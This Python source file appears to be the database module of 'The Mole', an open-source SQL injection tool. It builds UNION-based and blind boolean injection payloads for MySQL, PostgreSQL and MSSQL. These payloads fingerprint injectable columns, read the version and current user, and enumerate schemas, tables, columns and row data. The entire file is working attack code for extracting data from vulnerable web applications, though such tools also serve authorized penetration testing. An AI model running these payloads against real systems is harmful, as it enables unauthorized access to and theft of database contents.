#!/usr/bin/python3
# 
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#       
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#       
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
# 
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

import re

class DbmsMole():
    field_finger_str = 'The_Mole.F1nger!'
    error_strings = [
                        "Error: Unknown column '(\d+)' in 'order clause'",
                        "SQLSTATE\[\d+\]"
                    ]
                    
    error_filters = [
                        re.compile("<br />\n<b>Warning</b>:  mysql_fetch_array\(\): supplied argument is not a valid MySQL result resource in <b>([\w\./]+)</b> on line <b>(\d+)</b><br />"),
                        re.compile("<br />\n<b>Warning</b>:  mysql_num_rows\(\): supplied argument is not a valid MySQL result resource in <b>([\w\./]+)</b> on line <b>(\d+)</b><br />"),
                    ]
    
    def injectable_field_fingers(cls, query_columns, base):
        pass
    
    @classmethod
    def remove_errors(cls, data):
        for i in DbmsMole.error_filters:
            data = i.sub('', data)
        return data
    
    @classmethod
    def dbms_check_query(cls, columns, injectable_field):
        pass
    
    @classmethod
    def to_hex(cls, string):
        output = ""
        for i in string:
            output += hex(ord(i)).replace('0x', '')
        return '0x' + output
    
    @classmethod
    def chr_join(cls, string):
        return '||'.join(map(lambda x: 'chr(' + str(ord(x)) + ')', string))
        
    @classmethod
    def char_concat(cls, string):
        return '+'.join(map(lambda x: 'char(' + str(ord(x)) + ')', string))
    
    @classmethod
    def field_finger(cls):
        return DbmsMole.field_finger_str
        
    @classmethod
    def dbms_name(cls):
        return ''
    
    @classmethod
    def is_error(cls, data):
        for i in DbmsMole.error_strings:
            if re.match(i, data):
                return True
        return False
    
    # Parses a "where condition", replacing strings within
    # single quotes(') for their representation in the current DBMS.
    def parse_condition(self, condition):
        cond = condition.split("'")
        for i in range(len(cond)):
            if i % 2 == 1:
                cond[i] = self.to_string(cond[i])
        return ''.join(cond)
    
    # Subclasses MUST implement this method to return a valid
    # string conversion for data in this dbms.
    def to_string(self, data):
        pass
    
    # Subclasses MUST implementent this method so it returns a string
    # which represents the concatenation of param fields.
    def _concat_fields(self, fields):
        pass
        
    def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
        return ' and {op_par}' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) from ' + table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'
        
    def forge_blind_count_query(self, operator, value, table, where="1=1"):
        return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+self.parse_condition(where)+')'

    def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
        return ' and {op_par}' + str(value) + ' ' + operator + ' (select length('+field+') from '+table+' where ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)+')'
        
    def schema_count_query(self, columns, injectable_field):
        return self.forge_query(columns, "count(*)", 
               self._schemas_query_info()['table'], injectable_field, offset=0)
    
    def schema_query(self, columns, injectable_field, offset):
        info = self._schemas_query_info()
        return self.forge_query(columns, info['field'], 
               info['table'], injectable_field, offset=offset)
               
    def table_count_query(self, db, columns, injectable_field):
        info = self._tables_query_info(db)
        return self.forge_query(columns, "count(*)", 
                    info['table'], injectable_field,
                    info['filter'],
               )

    def table_query(self, db, columns, injectable_field, offset):
        info = self._tables_query_info(db)
        return self.forge_query(columns, info['field'], 
                    info['table'], injectable_field,
                    info['filter'], offset=offset
               )

    def columns_count_query(self, db, table, columns, injectable_field):
        info = self._columns_query_info(db, table)
        return self.forge_query(columns, "count(*)", 
                    info['table'], injectable_field,
                    where=info['filter']
               )

    def columns_query(self, db, table, columns, injectable_field, offset):
        info = self._columns_query_info(db, table)
        return self.forge_query(columns, info['field'], 
                    info['table'], injectable_field,
                    where=info['filter'],
                    offset=offset
               )
               
    def fields_count_query(self, db, table, columns, injectable_field, where="1=1"):
        info = self._fields_query_info([], db, table, where)
        return self.forge_query(columns, "count(*)", 
                    info['table'], injectable_field,
                    where=info['filter']
               )

    def fields_query(self, db, table, fields, columns, injectable_field, offset, where="1=1"):
        info = self._fields_query_info(fields, db, table, where)
        return self.forge_query(columns, info['field'], 
                    info['table'], injectable_field,
                    where=info['filter'], 
                    offset=offset
               )
               
    def schema_blind_count_query(self, operator, value):
        info = self._schemas_query_info()
        return self.forge_blind_count_query(
            operator, value, info['table']
        )

    def schema_blind_len_query(self, operator, value, offset, where="1=1"):
        info = self._schemas_query_info()
        return self.forge_blind_len_query(
            operator, value, info['field'], info['table'], offset=offset, where=where
        )

    def schema_blind_data_query(self, index, value, offset, where="1=1"):
        info = self._schemas_query_info()
        return self.forge_blind_query(
            index, value, info['field'], info['table'], offset=offset, where=where
        )
        
    def table_blind_count_query(self, operator, value, db):
        info = self._tables_query_info(db)
        return self.forge_blind_count_query(
            operator, value, info['table'], 
            where=info['filter']
        )

    def table_blind_len_query(self, operator, value, db, offset):
        info = self._tables_query_info(db)
        return self.forge_blind_len_query(
            operator, value, info['field'], 
            info['table'], offset=offset, where=info['filter']
        )

    def table_blind_data_query(self, index, value, db, offset):
        info = self._tables_query_info(db)
        return self.forge_blind_query(
            index, value, info['field'], info['table'], 
            offset=offset, where=info['filter']
        )
        
    def columns_blind_count_query(self, operator, value, db, table):
        info = self._columns_query_info(db, table)
        return self.forge_blind_count_query(
            operator, value, info['table'], 
            where=info['filter']
        )

    def columns_blind_len_query(self, operator, value, db, table, offset):
        info = self._columns_query_info(db, table)
        return self.forge_blind_len_query(
            operator, value, info['field'], 
            info['table'], offset=offset, 
            where=info['filter']
        )

    def columns_blind_data_query(self, index, value, db, table, offset):
        info = self._columns_query_info(db, table)
        return self.forge_blind_query(
            index, value, info['field'], info['table'], 
            offset=offset, where=info['filter']
        )
        
    def fields_blind_count_query(self, operator, value, db, table, where="1=1"):
        info = self._fields_query_info([], db, table, where)
        return self.forge_blind_count_query(
            operator, value, info['table'], 
            where=where
        )

    def fields_blind_len_query(self, operator, value, fields, db, table, offset, where="1=1"):
        info = self._fields_query_info(fields, db, table, where)
        return self.forge_blind_len_query(
            operator, value, self._concat_fields(fields), 
            info['table'], offset=offset, where=info['filter']
        )

    def fields_blind_data_query(self, index, value, fields, db, table, offset, where="1=1"):
        info = self._fields_query_info(fields, db, table, where)
        return self.forge_blind_query(
            index, value, self._concat_fields(fields), 
            info['table'], offset=offset, where=info['filter']
        )
        
    def dbinfo_query(self, columns, injectable_field):
        info = self._dbinfo_query_info()
        return self.forge_query(columns, info['field'], 
               info['table'], injectable_field, offset=0)

    def dbinfo_blind_len_query(self, operator, value):
        info = self._dbinfo_query_info()
        return self.forge_blind_len_query(
            operator, value, self._concat_fields(info['field'].split(',')), info['table']
        )

    def dbinfo_blind_data_query(self, index, value):
        info = self._dbinfo_query_info()
        return self.forge_blind_query(
            index, value, self._concat_fields(info['field'].split(',')), info['table']
        )

class MysqlMole(DbmsMole):
    out_delimiter_result = "::-::"
    out_delimiter = DbmsMole.to_hex(out_delimiter_result)
    inner_delimiter_result = "><"
    inner_delimiter = DbmsMole.to_hex(inner_delimiter_result)

    @classmethod
    def to_string(cls, data):
        return DbmsMole.to_hex(data)
    
    def _schemas_query_info(self):
        return {
            'table' : 'information_schema.schemata',
            'field' : 'schema_name'
        }
    
    def _tables_query_info(self, db):
        return {
            'table' : 'information_schema.tables',
            'field' : 'table_name',
            'filter': "table_schema = '{db}'".format(db=db)
        }
    
    def _columns_query_info(self, db, table):
        return {
            'table' : 'information_schema.columns',
            'field' : 'column_name',
            'filter': "table_schema = '{db}' and table_name = '{table}'".format(db=db, table=table)
        }
        
    def _fields_query_info(self, fields, db, table, where):
        return {
            'table' : db + '.' + table,
            'field' : ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)),
            'filter': where
        }
        
    def _dbinfo_query_info(self):
        return {
            'field' : 'user(),version(),database()', 
            'table' : 'information_schema.schemata'
        }
    
    def _concat_fields(self, fields):
        return 'CONCAT_WS(' + MysqlMole.inner_delimiter + ',' + ','.join(map(lambda x: 'IFNULL(' + x + ', 0x20)', fields)) + ')'
    
    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        hashes = []
        to_search = []
        for i in range(0, query_columns):
            hashes.append(DbmsMole.to_hex(str(base + i)))
            to_search.append(str(base + i))
        return [(hashes, to_search)]
    
    @classmethod
    def dbms_name(cls):
        return 'Mysql 5'
    
    @classmethod
    def blind_field_delimiter(cls):
        return MysqlMole.inner_delimiter_result
    
    @classmethod
    def field_finger_query(cls, columns, injectable_field):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(map(str, range(columns)))
        query_list[injectable_field] = DbmsMole.to_hex(DbmsMole.field_finger_str)
        query += ",".join(query_list)
        return query
    
    @classmethod
    def dbms_check_query(cls, columns, injectable_field):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(map(str, range(columns)))
        query_list[injectable_field] = "CONCAT({fing},@@version,{fing})".format(fing=MysqlMole.out_delimiter)
        query += ",".join(query_list) + " "
        return query

    @classmethod
    def dbms_check_blind_query(cls):
        return ' and 0 < (select length(@@version)) '

    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(map(str, range(column_count)))
        query_list[injectable_field] = ("CONCAT(" +
                                            MysqlMole.out_delimiter +
                                            ",CONCAT_WS(" +
                                                MysqlMole.inner_delimiter + "," + 
                                                fields +
                                            ")," +
                                            MysqlMole.out_delimiter +
                                        ")")
        query += ','.join(query_list)
        query += " from " + table_name + " where " + self.parse_condition(where) + \
                 " limit 1 offset " + str(offset) + " "
        return query

    def parse_results(self, url_data):
        data_list = url_data.split(MysqlMole.out_delimiter_result)
        if len(data_list) < 3:
            return None
        data = data_list[1]
        return data.split(MysqlMole.inner_delimiter_result)
    
    def __str__(self):
        return "Mysql 5 Mole"



# Postgres mole.


class PostgresMole(DbmsMole):
    out_delimiter_result = "::-::"
    out_delimiter = DbmsMole.chr_join(out_delimiter_result)
    inner_delimiter_result = "><"
    inner_delimiter = DbmsMole.chr_join(inner_delimiter_result)
    
    def to_string(self, data):
        return DbmsMole.chr_join(data)
        
    def _schemas_query_info(self):
        return {
            'table' : 'pg_catalog.pg_database',
            'field' : 'datname'
        }
    
    def _tables_query_info(self, db):
        return {
            'table' : 'information_schema.tables',
            'field' : 'table_name',
            'filter': "table_schema = '{db}'".format(db=self._db_name(db))
        }
    
    def _columns_query_info(self, db, table):
        return {
            'table' : 'information_schema.columns',
            'field' : 'column_name',
            'filter': "table_schema = '{db}' and table_name = '{table}'".format(db=self._db_name(db), table=table)
        }
        
    def _fields_query_info(self, fields, db, table, where):
        return {
            'table' : table,
            'field' : ','.join(fields),
            'filter': where
        }
        
    def _dbinfo_query_info(self):
        return {
            'field' : 'getpgusername(),version(),current_database()', 
            'table' : 'information_schema.schemata'
        }

    @classmethod
    def dbms_name(cls):
        return 'Postgres'
    
    @classmethod
    def blind_field_delimiter(cls):
        return PostgresMole.inner_delimiter_result
    
    @classmethod
    def dbms_check_blind_query(cls):
        return ' and {op_par}0 < (select length(getpgusername()))'
    
    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = []
        for i in range(column_count):
            query_list.append('(' + DbmsMole.chr_join(str(i)) + ')::unknown')
        query_list[injectable_field] = ("(" + PostgresMole.out_delimiter + "||(" +
                                            ('||' + PostgresMole.inner_delimiter + '||').join(fields.split(',')) +
                                            ")||" + PostgresMole.out_delimiter + ")"
                                        )
        query += ','.join(query_list)
        query += " from " + table_name + " where " + self.parse_condition(where) + \
                 " limit 1 offset " + str(offset)
        return query
    
    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        hashes = []
        to_search = []
        for i in range(query_columns):
            hashes.append('(' + DbmsMole.chr_join(str(base + i)) + ')::unknown')
            to_search.append(str(base + i))
        return [(hashes, to_search)]
    
    @classmethod
    def field_finger_query(cls, columns, injectable_field):
        query = " and 1=0 UNION ALL SELECT "
        query_list = []
        for i in range(columns):
            query_list.append('(' + DbmsMole.chr_join(str(i)) + ')::unknown')
        query_list[injectable_field] = "(" + DbmsMole.chr_join(DbmsMole.field_finger_str) + ")::unknown"
        query += ",".join(query_list)
        return query

    @classmethod
    def dbms_check_query(cls, columns, injectable_field):
        return PostgresMole().forge_query(
            columns, 'getpgusername()', 'pg_user', injectable_field
        )

    def _concat_fields(self, fields):
        return ('||' + PostgresMole.inner_delimiter + '||').join(map(lambda x: 'coalesce(' + x + ',CHR(32))', fields))


    def _db_name(self, db):
        if db.startswith('postgres'):
            return 'pg_catalog'
        else:
            return 'public'

    def parse_results(self, url_data):
        data_list = url_data.split(PostgresMole.out_delimiter_result)
        if len(data_list) < 3:
            return None
        data = data_list[1]
        return data.split(PostgresMole.inner_delimiter_result)
    
    def __str__(self):
        return "Posgresql Mole"


class MssqlMole(DbmsMole):
    out_delimiter_result = "::-::"
    out_delimiter = DbmsMole.char_concat(out_delimiter_result)
    inner_delimiter_result = "><"
    inner_delimiter = DbmsMole.char_concat(inner_delimiter_result)

    def to_string(self, data):
        return DbmsMole.char_concat(data)

    def _schemas_query_info(self):
        return {
            'table' : 'master..sysdatabases',
            'field' : 'name'
        }

    def _tables_query_info(self, db):
        return {
            'table' : db + '..sysobjects',
            'field' : 'name',
            'filter': "xtype = 'U'"
        }
        
    def _columns_query_info(self, db, table):
        return {
            'table' : db + '..syscolumns',
            'field' : 'name',
            'filter': "id = (select id from {db}..sysobjects where name = '{table}')".format(db=db, table=table)
        }

    def _fields_query_info(self, fields, db, table, where):
        return {
            'table' : db + '..' + table,
            'field' : ','.join(fields),
            'filter': where
        }

    def _dbinfo_query_info(self):
        return {
            'field' : 'user_name(),@@version,db_name()', 
            'table' : 'information_schema.schemata'
        }


    def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
        return (' and {op_par}' + (str(value) + ' < (select top 1 ascii(substring({fields}, '+str(index)+', 1)) from ' + 
               '{table} where {where} and {fields} not in (select top {off} {fields} from {table} where {where}))').format(
                    table=table, fields=fields, where=self.parse_condition(where), off=offset)
                )
        
    def forge_blind_count_query(self, operator, value, table, where="1=1"):
        return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+self.parse_condition(where)+')'

    def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
        return (' and {op_par}' + (str(value) + ' ' + operator + ' (select top 1 len({field}) from {table} where ' + 
                '{where} and {field} not in (select top {off} {field} from {table} where {where}))').format(table=table,field=field,where=self.parse_condition(where),off=offset))

    @classmethod
    def blind_field_delimiter(cls):
        return MssqlMole.inner_delimiter_result

    @classmethod
    def dbms_check_blind_query(cls):
        return ' and {op_par}0 < (select len(user_name()))'

    @classmethod
    def dbms_name(cls):
        return 'Mssql'
        
    def __str__(self):
        return "Mssql Mole"

    @classmethod
    def injectable_field_fingers(cls, query_columns, base):
        output = []
        for i in range(query_columns):
            hashes = list(map(lambda x: 'null', range(query_columns)))
            to_search = list(map(lambda x: '3rr_NO!', range(query_columns)))
            to_search[i] = str(base + i)
            hashes[i] = str(base + i)
            output.append((list(hashes), to_search))
            hashes[i] = DbmsMole.char_concat(str(base + i))
            output.append((hashes, to_search))
        hashes = []
        for i in range(base, base + query_columns):
            hashes.append(DbmsMole.char_concat(str(i)))
        to_search = list(map(str, range(base, base + query_columns)))
        output.append((list(hashes), to_search))
        hashes = []
        for i in range(base, base + query_columns):
            hashes.append(str(i))
        output.append((list(hashes), to_search))
        return output

    @classmethod
    def field_finger_query(cls, columns, injectable_field):
        query = " and 1=0 UNION ALL SELECT "
        query_list = list(map(lambda x: 'null', range(columns)))
        query_list[injectable_field] = DbmsMole.char_concat(DbmsMole.field_finger_str)
        query += ",".join(query_list)
        return query

    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
        query = " and 1 = 0 UNION ALL SELECT TOP 1 "
        query_list = list(map(lambda x: 'null', range(column_count)))
        if fields == 'count(*)':
            query_list[injectable_field] = (MssqlMole.out_delimiter + '+cast(count(*) as varchar(50))+' + MssqlMole.out_delimiter)
            query += ','.join(query_list)
            return query + " from " + table_name + " where " + self.parse_condition(where)
        fields = self._concat_fields(fields.split(','))
        query_list[injectable_field] = (MssqlMole.out_delimiter + "+" + fields + "+" + MssqlMole.out_delimiter)
        where = self.parse_condition(where)
        query += ','.join(query_list)
        query += (" from " + table_name + " where " + fields +  " not in (select top " + 
                  str(offset) + " " + fields + " from " + table_name + " where " + where + ") and ")
        query += where
        return query

    def _concat_fields(self, fields):
        return ('+' + MssqlMole.inner_delimiter + '+').join(map(lambda x: 'isnull(cast(' + x + ' as varchar(100)), char(32))' ,fields))

    @classmethod
    def dbms_check_query(cls, columns, injectable_field):
        query = " and 1 = 0 UNION ALL SELECT "
        query_list = list(map(lambda x: 'null', range(columns)))
        query_list[injectable_field] = "{fing}+@@version+{fing}".format(fing=MssqlMole.out_delimiter)
        query += ",".join(query_list)
        return query

    def parse_results(self, url_data):
        data_list = url_data.split(MssqlMole.out_delimiter_result)
        if len(data_list) < 3:
            return None
        data = data_list[1]
        return data.split(MssqlMole.inner_delimiter_result)
